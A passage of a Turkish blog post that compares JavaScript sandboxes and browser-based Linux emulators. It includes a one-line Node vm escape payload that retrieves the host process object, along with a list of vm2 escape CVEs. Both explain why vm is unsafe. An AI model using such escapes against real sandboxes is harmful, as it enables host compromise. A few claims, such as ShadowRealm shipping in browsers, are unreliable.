# Her JavaScript sandbox'ı, emülatörü, simülatörü ve honeypot'u -- karşılaştırmalı

Uzun süredir bu tavşan deliğinde çok ama çok derinlere dalmış durumdayım. Her şey [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) projesine yardım ederken başladı -- Fortune'un projesi (birazdan ondan daha fazla bahsedeceğim) -- ve sürekli "bekle, bunun `v86`'dan farkı ne?" veya "neden sadece `vm2` kullanmıyorsun?" gibi sorular alıyordum -- ve önce tüm ekosistemi haritalandırmadan temiz bir cevap veremeyeceğimi fark ettim. İşte buradayız işte lol.

Meğer dört farklı aile varmış -- JS sandbox'ları, Linux emülatörleri, Linux simülatörleri ve honeypot'lar -- ve neredeyse hiç örtüşmüyorlar, her ne kadar sürekli aynı cümlede anılsalar da. Bir eklenti sistemi inşa eden `isolated-vm`'e uzanır. Bir CLI aracı tanıtan `v86`'ya uzanır. SSH tehdit istihbaratı yapan Cowrie'ye uzanır. "Kodu bir kutuda çalıştırmak" şeklindeki aynı belirsiz şemsiye altında tamamen farklı problemleri çözüyorlar.

Kaynak kodları, CVE raporlarını, mimari dokümanlarını ve npm sayfalarını okumak için çok zaman harcadım. Bu çok ama çok uzun olacak -- bir kahve al, cidden. Ya da iki.

> Hızlı uyarı: `typescript-virtual-container` bu makalede sıkça yer alıyor çünkü bu araştırmayı tetikleyen şey buydu. Diğer her şeye karşı adil olmaya çalıştım, ama bu bağlamı aklında tut.

---

## Bölüm 0 -- Öncelikle, aslında hangi problemi çözüyorsun?

Derinlemesine dalmadan önce, her ailenin ne için olduğunu kesin olarak belirtmekte fayda var, çünkü terminoloji hızla karmaşıklaşıyor ve insanlar sürekli karıştırıyor (ben de dahil, oturup gerçekten haritalandırmadan önce).

**JS sandbox'ları**, JavaScript kodunu ana Node.js sürecinden izole eder. Tehdit modeli: `process.exit()` çağırabilecek, dosya okuyabilecek veya alt süreçler başlatabilecek güvenilmeyen JS kodudur. Çözüm, V8 yürütmesi etrafında bir sınırdır. Bu araçların bir Linux shell'i, izinleri olan bir dosya sistemi veya SSH hakkında hiçbir kavramı yoktur.

**Linux emülatörleri**, gerçek, değiştirilmemiş bir Linux çekirdeğini bir CPU emülatörü (x86, RISC-V, OR1K) içinde JavaScript veya WebAssembly ile çalıştırır. Gerçek bir işletim sistemi başlatırsın. Gerçek syscall'lar alırsın. x86 ile derlenmiş programlarla ikili uyumluluk elde edersin. Ek yük devasadır.

**Linux simülatörleri**, gerçek bir çekirdek çalıştırmadan bir Linux sisteminin *davranışını* taklit eder. Bir shell yorumlayıcısı, sanal bir dosya sistemi ve programları ve insanları kandırmaya yetecek kadar Unix semantiği uygularlar. Çekirdek yok. Wasm yok. CPU emülasyonu yok. Çok daha düşük ek yük.

**Honeypot'lar**, saldırganları çekmek ve ne yaptıklarını kaydetmek için inşa edilir. Öncelikli olarak yürütme ortamları değildirler -- gözlem araçlarıdırlar. Gerçek Linux davranışına sadakat, sadece saldırganın tuzağı tespit etmesini engellemek için önemlidir.

Bu çerçeveyle, bu makaledeki her projenin nerede durduğu şöyle:

```
JS sandbox'ı:       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Linux emülatörü:    v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Linux simülatörü:   typescript-virtual-container (bu alanda benzersiz)
Honeypot:           Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Terminal yığını:    xterm.js + node-pty (izolatör değil, ama bitişik)
```

---

## Bölüm 1 -- JavaScript sandbox'ları

### 1.1 `vm` -- Node.js yerleşiği (düşündüğün gibi değil)

Node'da "güvenilmeyen JS çalıştırmanın" en eski cevabı, yerleşik `vm` modülüdür. v0.1'den beri vardır, bu yüzden birçok kişi önce ona uzanır -- ve sonra yanar.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

`vm`'nin gerçekte yaptığı: yeni bir V8 context'i (yeni bir dizi yerleşik yapıcı -- `Object`, `Array`, `Function` vb.) oluşturur ve kodu, `sandbox`'a koyduğun her şeye paylaşılan bir referansla çalıştırır. V8 motorun değişmez. Sürecin değişmez. Bellek paylaşılır.

`vm`'nin güvenlik sağlamamasının nedeni: JavaScript'in prototip zinciri, her şeyi `Object.prototype`'a bağlayan bir DAG'dir. Ana realm'den sandbox'a herhangi bir nesne koyarsan, misafir onun prototip zincirinden tırmanarak ana yapıcılara ulaşabilir. `Function`'dan, `Function("return process")()` çağırarak gerçek `process` nesnesini kurtarabilirsin. Oyun biter. Anında.

```js
// Bu, vm'de sorunsuz çalışır -- gerçek process nesnesini geri alırsın
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Yani, Node.js dokümantasyonunun kendisi bile şöyle diyor: "vm modülü bir güvenlik mekanizması değildir. Güvenilmeyen kodu çalıştırmak için kullanmayın." Bu uyarı sonsuza kadar oradaydı. İnsanlar sürekli görmezden geliyor. Production uygulamalarında `vm`'yi sandbox olarak kullanıldığını gördüm. Lütfen bunu yapma xD

**Karar**: bir kapsam mekanizması, sandbox değil. İzole değişken kapsamına ihtiyacın olduğunda kullan (şablon motorları, kodu kontrol ettiğin `eval` benzeri özellikler). Asla güvenilmeyen girdi için.

**Bellek**: ihmal edilebilir ek yük -- ana süreçle aynı V8 heap'i.  
**Güvenlik**: motive bir saldırgana karşı hiçbiri.

---

### 1.2 `vm2` -- topluluk girişimi ve çok uzun ölümü

`vm2`, topluluğun `vm`'nin kaçış sorununa cevabıydı. Temel fikir: sandbox sınırını geçen her nesneyi, özellik erişimini engelleyen, prototip tırmanmayı bloke eden ve tehlikeli referansları filtreleyen bir `Proxy` ile sarmalamak. Teoride zekice bir fikir! Pratikte pek değil, göreceğimiz gibi.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // VMError fırlatır, process erişilebilir değil
```

Birkaç yıl boyunca makul ölçüde iyi çalıştı. Ancak JavaScript `Proxy`'sinin saldırı yüzeyi devasadır. Her yeni JS dil özelliği -- generator'lar, async iterator'lar, `Symbol.toPrimitive`, `Error.prepareStackTrace`, `Promise` iç yuvaları -- potansiyel bir bypass vektörüdür.

CVE zaman çizelgesi... başka bir şey. Yani, şuna bak:

| Tarih | CVE | Mekanizma |
|------|-----|-----------|
| Eki 2022 | CVE-2022-36067 | `Error.prepareStackTrace` ana context kaçışı |
| Nis 2023 | CVE-2023-29017 | İşlenmeyen async hata yığını ana nesne sızıntısı |
| Nis 2023 | CVE-2023-29199 | `handleException()` ile istisna temizleme bypass'ı |
| Nis 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| May 2023 | CVE-2023-32314 | `Error.name` üzerinde `Proxy` → `Function` → RCE |
| Tem 2023 | CVE-2023-37466 | Async fonksiyon + yığın taşması + `Proxy.getPrototypeOf` |
| Tem 2023 | CVE-2023-37903 | Worker thread + eval kaçışı |

Aynı ayda (Nisan 2023) ÜÇ kritik CVE. BİR AYDA ÜÇ TANE. CVE-2023-37903'ten sonra, bakımcı, kütüphaneyi şu mesajla resmen deprecate etti: *"Kütüphane kritik güvenlik sorunları içeriyor ve production için kullanılmamalıdır."*

Bakımcı, Ekim 2025'te 3.10.0 sürümüyle onu diriltti ve o zamana kadar bilinen her şeyi düzelttiğini iddia etti. Ocak 2026'da yeni bir kritik kaçış (CVE-2026-22709, CVSS 9.8) açıklandı, ardından Mayıs 2026'da on bir tane daha geldi. On bir. Desen değişmedi ve dürüst olmak gerekirse asla değişeceğini sanmıyorum.

Temel sorun mimari -- ve tüm ekosistemin öğrenmesi biraz zaman alan ders bu. Sandbox yaptığın dili kullanarak, aynı motorda, aynı süreçte güvenli bir sandbox inşa edemezsin. Kaçış yüzeyi, tüm V8 uygulamasıdır -- ve V8, sürekli değişen birkaç milyon satır C++'tır. Her yeni JS özelliği potansiyel olarak yeni bir saldırı yolu açar.

**Karar**: Güvenlik açısından hassas uygulamalar için kullanma. En son sürümde bile, her birkaç ayda bir yeni bypass'lar keşfediliyor. Bakımcının kendisi bunu açıkça kabul etti.

---

### 1.3 `isolated-vm` -- gerçekten çalışan

`isolated-vm` doğru yaklaşımı benimser: V8'in kendi izolasyon ilkelini, Isolate'i kullanır. Her V8 Isolate'in kendi heap'i, kendi garbage collector'ü, kendi yerleşik seti ve diğer Isolate'lerle sıfır paylaşılan referansı vardır.

Bu, Chrome'un sekmeler arasında kullandığı sınırdır. Proxy üzerine inşa edilmiş bir dil seviyesi hilesi değil, gerçek bir güvenlik sınırıdır.

```js
import ivm from "isolated-vm";

// Her isolate kendi V8 heap'idir
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB sınırı
const context = await isolate.createContext();
const jail = context.global;

// Sınır ötesi veri iletimi açık serileştirme gerektirir
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Ana sürece, ana heap'e veya ana modüllere erişemez
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Zaman aşımı veya bellek limitinde sert sonlandırma yapabilirsin
isolate.dispose(); // tüm heap'i serbest bırakır
```

`Reference` ve `ExternalCopy` türleri, açık iletişim köprüsüdür. Bir `Reference`, isolate'e bir ana fonksiyonuna çağrılabilir bir tanıtıcı verir -- isolate onu çağırabilir ama closure'ını veya prototipini inceleyemez. Bir `ExternalCopy`, bir değeri (yapılandırılmış klon) heap sınırı boyunca serileştirir. Bu açık-köprü modeli kullanışlı değildir, ama izolasyonu gerçek kılan şey budur.

Sert kaynak limitleri ayarlayabilirsin: bellek (limit aşılırsa isolate sonlandırılır), duvar saati zaman aşımı ve CPU zaman aşımı. Sonlandırma gerçektir -- bir `while(true)` ile bypass edilebilecek bir JS zaman aşımı değil, tüm V8 Isolate'ini öldürür.

**Sınırlamalar**: sadece JS. İçinde bash çalıştıramazsın. Dosya, izin, ağ veya süreç kavramı yoktur. Kullanıcı tarafından gönderilen JS (eklentiler, formüller, script kancaları) için tam olarak doğru araçtır ve diğer her şey için yanlış araçtır. `typescript-virtual-container`'ın yazarı, "shell komutları çalıştırmak" ve "JavaScript'i izole etmek" temelde farklı problemler olduğunu fark etmeden önce bunu erken aşamalarda değerlendirdiğinden bahsetti.

**Bellek**: boş isolate başına ~3–10 MB, heap kullanımıyla büyür.  
**Güvenlik**: güçlü. V8 Isolate sınırı gerçek izolasyon ilkelidir.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- Wasm'a derlenmiş ayrı bir JS motoru

Farklı bir yaklaşım: V8 içinde izole etmek yerine, WebAssembly'e derlenmiş tamamen ayrı bir JavaScript motoru çalıştır. Ana makine V8/Node'da çalışır. Misafir QuickJS-Wasm içinde çalışır. Wasm sandbox'ı izolasyon sınırını sağlar.

QuickJS, Fabrice Bellard'ın bir başka işi (QEMU, FFmpeg, JSLinux, TinyEMU'nun arkasındaki aynı adam -- bu kişi gerçek değil, cidden, bir insan bunların hepsini nasıl yapar?). C ile yazılmış, spec uyumlu küçük bir ES2023 JS motoru ve Wasm'a derlendiğinde sadece ~500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // QuickJS'de çalışır, V8'den tamamen ayrı
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS, C ile yazılmış, spec uyumlu küçük bir ES2023 JavaScript motorudur. Wasm'a derlendiğinde, senkron varyant için ~500 KB, asenkron (Asyncify) varyant için ~1 MB'dır. Bellek yönetimi manueldir -- VM'den çıkardığın her değerin açıkça dispose edilmesi gerekir, bu biraz can sıkıcıdır ama sınırlar arası GC sürprizlerini önler. Eğlenceli bir takas!

`@sebastianwessel/quickjs` sarmalayıcısı, üzerine isteğe bağlı sanal dosya sistemi, fetch desteği ve Node.js modül saplamaları ile daha ergonomik bir API ekler:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Güvenlik modeli `isolated-vm`'den farklıdır: Wasm'in lineer bellek modeli, misafirin V8 heap nesnelerine doğrudan erişememesi anlamına gelir. Saldırı yüzeyi, tüm JS dili değil, ana↔Wasm arayüzüdür (import/export). Bu genellikle Proxy tabanlı sandbox'lama'dan daha sağlam kabul edilir.

Dezavantajı: QuickJS, V8 ile aynı optimizasyon seviyesine sahip değildir. CPU bağımlı JS iş yükleri için V8'den 5–20 kat daha yavaştır. Kısa snippet'ler ve güvenilmeyen eval için bu genellikle önemli değildir.

**Bellek**: örnek başına ~500 KB Wasm modülü + heap.  
**Güvenlik**: Wasm sınırı, Proxy tabanlı yaklaşımlardan daha güçlü kabul edilir.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- önce izinler çalışma zamanı

Deno tamamen farklı bir felsefe benimser: Node içinde sandbox yapmak yerine, varsayılan olarak güvenli yeni bir çalışma zamanı inşa et. Bu yaklaşımı gerçekten seviyorum -- dürüst olmak gerekirse, Node.js'in baştan beri böyle olması gerekirdi. Ryan Dahl (orijinal Node.js yaratıcısı) kelimenin tam anlamıyla Deno'yu bazı Node.js tasarım kararlarından pişman olduğu için yaptı, ki bu düşününce oldukça çılgınca.

Her hassas yetenek (dosya okuma, dosya yazma, ağ, env, alt süreç) açık bir `--allow-*` flag'i gerektirir:

```bash
# Bu sadece /data'dan okuyabilir, başka hiçbir şey
deno run --allow-read=/data script.ts

# Bu sadece bir alana fetch yapabilir
deno run --allow-net=api.example.com script.ts

# Hiç flag yok = hiç izin yok
deno run untrusted.ts # okuyamaz, yazamaz, ağa çıkamaz, süreç başlatamaz
```

İzin modeli Rust/İşletim Sistemi seviyesinde uygulanır -- bir JS hilesi değildir. Deno kodu `Deno.readFile()` çağırdığında, bu dosya sistemine dokunmadan önce izin tablosunu kontrol eden bir Rust op'undan geçer. İzin verilmezse syscall asla gerçekleşmediği için JS'den atlatamazsın.

Gerçekten güvenilmeyen kodu çalıştırmak için, Deno Workers (Web Workers) aynı süreç içinde ikinci bir isolate sağlar, her biri kendi izin setine sahiptir. Sıfır izinle bir worker başlatabilir ve `postMessage` ile iletişim kurabilirsin.

Deno 2 (Ekim 2024'te yayınlandı) tam npm uyumluluğu ve Node.js uyumluluk shim'leri ekledi, bu da sunucu tarafı kullanım durumları için benimsenmesini önemli ölçüde artırdı.

**Takas**: Deno'nun güvenlik modeli, kısmen güvenebileceğin kod için mükemmeldir. Kötü niyetli olabilecek tamamen güvenilmeyen kod için, izin modeli yardımcı olmaz -- bir Isolate sınırı (`isolated-vm`) veya farklı bir motor (`quickjs-emscripten`) gerekir, çünkü Deno hala V8 çalıştırır ve sofistike saldırganlar V8 seviyesinde hatalar bulabilir.

---

### 1.6 TC39 ShadowRealm -- standart cevap (nihayet)

JavaScript standart organı (TC39), ShadowRealm adında bir teklife sahiptir ve `vm` ve `vm2`'nin yapmaya çalıştığını, ancak doğru bir güvenlik modeliyle standartlaştırmayı amaçlar. Bir ShadowRealm, kendi içselleri olan, dış realm'e erişimi olmayan ve dikkatlice kontrol edilmiş bir import/export arayüzüne sahip izole bir JS yürütme context'i oluşturur.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Ayrı içseller, dış realm'e erişim yok
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm, tarayıcılarda (Chrome 90+, Firefox 105+) mevcuttur ancak 2026 itibarıyla henüz kararlı Node.js'de yoktur. TC39 Compartments teklifi, modül seviyesinde izolasyon için bunun üzerine inşa edilir. Bunlar uzun vadeli standartlaştırılmış cevaplardır, ancak henüz sunucu tarafı Node kullanım durumları için production-ready değildir. Uzaktan geldiğini gördüğün ama henüz... orada olmayan şeylerden biri işte. Klasik TC39 xD

---

### Sandbox ailesi özeti

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **İzolasyon sınırı** | yok (sadece kapsam) | Proxy (kırık) | V8 Isolate | Wasm | V8 Isolate + Rust izinleri |
| **Bellek sınırı** | ❌ | ❌ | ✅ sert limit | ✅ Wasm heap | kısmi |
| **CPU zaman aşımı** | ❌ | ✅ (bypass edilebilir) | ✅ sert | ✅ | ✅ |
| **Güvenlik** | yok | kırık | güçlü | güçlü | güçlü |
| **JS hızı** | yerel V8 | yerel V8 | yerel V8 | ~10x yavaş | yerel V8 |
| **Tarayıcı** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Node uyumu** | yerel | ✅ | ✅ | kısmi shim'ler | kısmi |
| **Durum** | kararlı | riskli (yeni CVE'ler) | ✅ aktif | ✅ aktif | ✅ aktif |
| **RAM ek yükü** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

Çıkarım: güvenlik senin için önemliyse, tam olarak iki gerçek seçenek vardır -- `isolated-vm` (yerel eklenti, V8 Isolate, tam JS hızı) ve `quickjs-emscripten` (Wasm, tarayıcı uyumlu, hesaplama ağır kod için ~10x yavaş). Diğer her şey ya "lütfen yapma" (`vm`, `vm2`) ya da tamamen farklı bir problemi çözen bir çalışma zamanıdır (Deno). ShadowRealm sonunda bu resmi değiştirebilir, ama henüz orada değil.

---

## Bölüm 2 -- JavaScript'te Linux emülatörleri

İşte işlerin benim için gerçekten ilginçleştiği yer. Bunlar *gerçek* emülatörlerdir -- bir CPU komut setini JavaScript veya WebAssembly'de uygularlar, gerçek bir Linux çekirdek imajını başlatırlar ve gerçek kullanıcı alanı ikili dosyalarını çalıştırırlar. İzolasyon, misafir ve ana makinenin hiçbir şey paylaşmamasından gelir: farklı bellek alanları, farklı komut akışları.

Ödediğin bedel çok büyüktür, ama elde ettiğin şey gerçekten dikkat çekicidir: gerçek Linux, gerçekten çalışıyor, tarayıcında veya Node sürecinde. Yani, bunu düşününce oldukça çılgınca, değil mi?

### 2.1 `v86` -- JS + Wasm JIT'te x86 PC emülatörü

Fabrice (GitHub'da copy) tarafından yapılan `v86`, JavaScript'teki en yetenekli açık kaynak x86 emülatörüdür. 2013 civarında saf bir JS yorumlayıcı olarak başladı ve x86 temel bloklarının anında WebAssembly'e çevrildiği, performansı çarpıcı biçimde artıran bir JIT derlenmiş sisteme dönüştü.

Emule ettiği şeyler:
- **CPU**: x86-32 (IA-32), komut seti kabaca Pentium 1 seviyesinde. 64-bit (x86-64) desteği yok -- bu, eksik bir özellik değil, sert bir mimari sınırdır.
- **FPU**: JavaScript'in `Float64Array`'i aracılığıyla. x87 80-bit genişletilmiş hassasiyettir; JS double'ları 64-bit'tir. Bu, kayan nokta sonuçlarının gerçek bir CPU'dan biraz farklı olabileceği anlamına gelir.
- **Bellek**: yapılandırılabilir, JS heap'inde bir `SharedArrayBuffer` veya `ArrayBuffer`'a eşlenir.
- **Donanım**: 8254 PIT (zamanlayıcı), 8259 PIC (kesme denetleyicisi), 8042 klavye denetleyicisi (PS/2), CMOS RTC, SVGA uzantılı ve Bochs VBE'li VGA, IDE denetleyicisi, disket denetleyicisi (8272A), NE2000 ağ kartı.
- **BIOS**: SeaBIOS (açık kaynak x86 BIOS) kullanır.

JIT, temel blokları (sıçramasız x86 komut dizileri) belirleyerek, bunları bir WebAssembly fonksiyonuna çevirerek, bu fonksiyonu önbelleğe alarak ve aynı bloğun sonraki çalıştırmalarında çağırarak çalışır. Sıcak kod yolları yerel Wasm performansı alır. Soğuk yollar JS yorumlayıcısına düşer.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Seri port çıktısını yakala (Linux çekirdek konsolu)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Misafire girdi gönder (shell'e yaz)
emulator.serial0_send("ls /\n");
```

**Desteklenen işletim sistemleri**: Alpine Linux (mükemmel), Ubuntu 16.04/18.04 (sadece i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (kısıtlamalarla), MS-DOS.

**Başlatma süresi**: Temiz bir imajdan Alpine Linux için 15–40 saniye. Bu, gerçek çekirdek başlatmanın doğasında vardır -- atlayamazsın. Evet, kullanıcıların tarayıcılarında bir çekirdek başlatma dizisini izleyerek oturacaklar. İşte anlaşma bu xD

**Bellek tabanı**: örnek başına 100–256 MB. Yoğun bir Linux örneği için Wasm JIT kod önbelleği tek başına onlarca MB'a ulaşabilir.

**Node.js kullanımı**: tam desteklenir. DOM gerekmez -- sadece seri portu önemsiyorsan VGA çıktısı atılabilir.

**Yapamayacağın şeyler**: 64-bit ikili dosyalar çalıştıramazsın, modern çekirdek özelliklerini (eBPF, io_uring vb.) kullanamazsın veya bellek limitlerine çarpmadan aynı anda bir avuçtan fazla örnek çalıştıramazsın.

**npm**: [v86](https://www.npmjs.com/package/v86) -- sürekli güncellenir, bu yazının yazıldığı an son yayınlanan sürüm son bir gün içinde.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux ve TinyEMU -- Bellard'ın işi, iki kere

JSLinux, Fabrice Bellard'ın kendi JavaScript Linux emülatörüdür -- 2011'de yayınlanan ilk örnek. Bu makalede Bellard'dan bahsedip duruyorum çünkü karşıma çıkmaya devam ediyor: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Adam başka bir şey. Gerçekten, abartısız, yazılım tarihindeki en etkileyici bireysel teknik katkılardan biri.

Orijinal JSLinux saf bir JS x86 yorumlayıcıydı. 2016'da Bellard, TinyEMU'yu (C ile yazılmış bir RISC-V emülatörü) yazdı, onu Emscripten aracılığıyla JavaScript'e derledi ve bu, mevcut JSLinux'un temeli oldu. Yani mevcut JSLinux aslında JavaScript üreten C kodudur -- elle yazılmış JS değil.

Bellard'ın sitesindeki teknik notlar okumaya değer: mevcut JSLinux, VirtIO konsol, VirtIO ağ, VirtIO blok aygıtı ve ana makineyle dosya paylaşımı için bir 9P dosya sistemini emule eden 32 veya 64-bit bir RISC-V CPU (x86 değil) çalıştırır. JS demosu, Emscripten kullanılarak C'den derlenmiştir -- elle yazılmış JS değil.

TinyEMU'nun kendisi şunları destekler:
- RISC-V RV32IMAFDQC ve RV64IMAFDQC (32 ve 64-bit, float, çarpma, sıkıştırılmış komutlarla)
- KVM aracılığıyla x86 (sadece yerel, emülasyon yok -- yani JS sürümü sadece RISC-V)
- VirtIO konsol, ağ, blok, girdi, 9P dosya sistemi

TinyEMU, Emscripten aracılığıyla sağlanan bir JavaScript demosuna sahiptir. JSLinux'un temelidir ve ayrıca `container2wasm` tarafından da kullanılır (bkz. bölüm 2.5).

**JSLinux durumu**: npm paketi yok, programatik API yok. Tarayıcında açtığın bir demo. Tarihsel önemi yüksektir -- konsepti kanıtladı. Kütüphane olarak pratik kullanımı: yok.

**TinyEMU**: npm'de yok, C kaynağı [bellard.org/tinyemu](https://bellard.org/tinyemu/) adresinde.

---

### 2.3 jor1k -- OR1K emülatörü

jor1k, Sebastian Macke tarafından JavaScript ile yazılmış bir OpenRISC 1000 (OR1K) emülatörüdür. Tarihsel olarak ilginçtir çünkü jor1k, VirtIO 9P dosya sistemi desteğini tanıttı ve Bellard daha sonra bunu TinyEMU ve JSLinux'a dahil etti. Bu projeler arasındaki çapraz tozlaşma sıkıdır -- hepsi birbirinden ödünç alır, ki bu açık kaynak emülasyon çalışmalarıyla ilgili en havalı şeylerden biridir.

**Durum**: artık aktif olarak bakılmıyor, npm paketi yok. Bu noktada arşivlenmiş durumda. Çoğunlukla tarihsel bağlam için bilmekte fayda var -- yani birisi sohbette jor1k'ten bahsederse, artık ne olduğunu biliyorsun :)

---

### 2.4 CheerpX -- tarayıcı için ticari x86 emülatörü

Leaning Technologies tarafından yapılan CheerpX, ticari, production kalitesinde bir x86 Linux emülatörüdür. Açık kaynak değildir, ancak gerçek Debian/Ubuntu kullanıcı alanını çalıştırmak için v86'dan önemli ölçüde daha yeteneklidir. Tarayıcıda gerçek VSCode'a ihtiyacın varsa, uzanacağın şey budur.

v86'dan temel farklar:
- Daha geniş bir ISA'yı destekler (daha fazla x86 uzantısı, daha iyi glibc uyumluluğu)
- Tarayıcıda IndexedDB destekli dosya sistemi (sayfa yüklemeleri arasında kalıcı)
- `SharedArrayBuffer` aracılığıyla pthread desteği (COOP/COEP başlıkları gerektirir -- evet o sinir bozucu güvenlik başlıkları)
- Sadece minimal işletim sistemi imajları değil, VSCode, Python, Node.js ve diğer gerçek uygulamaları çalıştırmak için tasarlanmıştır
- Profesyonel destek ve SLA mevcuttur

Tipik kullanım durumu, "bir sunucu olmadan tarayıcıda gerçek bir Linux uygulaması çalıştırmak"tır. Şirketler bunu tarayıcı tabanlı IDE'ler, kodlama eğitimleri ve etkileşimli dokümantasyon için kullanır.

```js
// CheerpX API (basitleştirilmiş)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Node.js hikayesi**: CheerpX öncelikle tarayıcı içindir. Alttaki emülatör teoride Node'da çalışabilir (Wasm), ancak API ve dokümantasyon tamamen tarayıcı kullanımına yöneliktir. Sunucu tarafı kullanımı desteklenmez.

**Bellek**: v86'ya benzer -- gerçek bir Debian örneği için 200+ MB.  
**Fiyatlandırma**: açık kaynak projeler için ücretsiz, production SaaS için ticari lisans.  
**Doküman**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Wasm'de Node.js, Linux emülasyonu değil

WebContainers genellikle Linux emülatörleriyle birlikte anılır ancak mimari olarak farklıdır. x86 emüle etmezler. Linux başlatmazlar. WASI kullanarak WebAssembly'e derlenmiş Node.js çalıştırırlar. Bu ayrım çok önemlidir ve ben de kendim çok uzun süre kafam karışık olarak harcadım lol.

Bence kafa karışıklığı pazarlamadan geliyor -- "tarayıcında Node.js çalıştır" kulağa emülasyon gibi geliyor, ama aslında bir VM içinde Node.js çalıştıran Linux emülasyonu değil, Wasm'a derlenmiş Node.js'in kendisi. Tamamen farklı bir şey.

Mimari:
1. Node.js, Wasm'a derlenir (özellikle özel bir WASI çalışma zamanı)
2. Bir Service Worker, emüle edilen Node.js sunucusundan gelen ağ isteklerini yakalar ve bunları tarayıcı sekmesine yönlendirir
3. Dosya sistemi tarayıcı belleğinde yaşar (disk G/Ç yok)
4. npm, tarayıcı içi kullanım için optimize edilmiş özel bir uygulamadır

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Dosyaları yaz
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Node.js komutlarını çalıştır
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Gerçek Node.js (Wasm-derlenmiş) çalıştırdığı için, gerçek npm, gerçek Node.js API'leri ve gerçek modül çözümlemesi alırsın. Genel amaçlı bir Linux kullanıcı alanı almazsın -- `apt` ile sistem paketleri kuramazsın, rastgele derlenmiş ikili dosyaları çalıştıramazsın veya Node.js ekosistemi dışında fazla bir şey yapamazsın.

**Tarayıcı gereksinimleri**: SharedArrayBuffer (COOP/COEP başlıkları gerektirir), Service Worker desteği, modern Wasm.

**Node.js hikayesi**: sadece tarayıcı kullanımı için tasarlanmıştır. API, tarayıcı context'i dışında çalışmaz.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Doküman**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- Wasm'a derlenmiş Docker konteynerleri

`container2wasm`, NTT'den bir Docker konteyner imajını alıp herhangi bir Wasm ana bilgisayarında -- bir tarayıcı dahil -- çalışabilen bir WebAssembly ikili dosyasına dönüştüren bir araçtır (npm paketi değil). Bunu ilk gördüğümde gerçekten işe yaradığına inanmamıştım.

Mekanizma:
- x86_64 konteynerler için: Bochs'u (Wasm'a derlenmiş bir x86 emülatörü) + konteynerin kök dosya sistemini gömer
- riscv64 konteynerler için: TinyEMU'yu (yine Bellard!) + konteynerin kök dosya sistemini gömer
- Ortaya çıkan `.wasm` dosyası emülatörü başlatır, konteyner dosya sistemini bağlar ve konteynerin giriş noktasını çalıştırır

```bash
# Ubuntu 22.04 konteynerini Wasm'a dönüştür
c2w ubuntu:22.04 out.wasm

# Çalıştır
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Veya tarayıcı kullanımı için sun
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

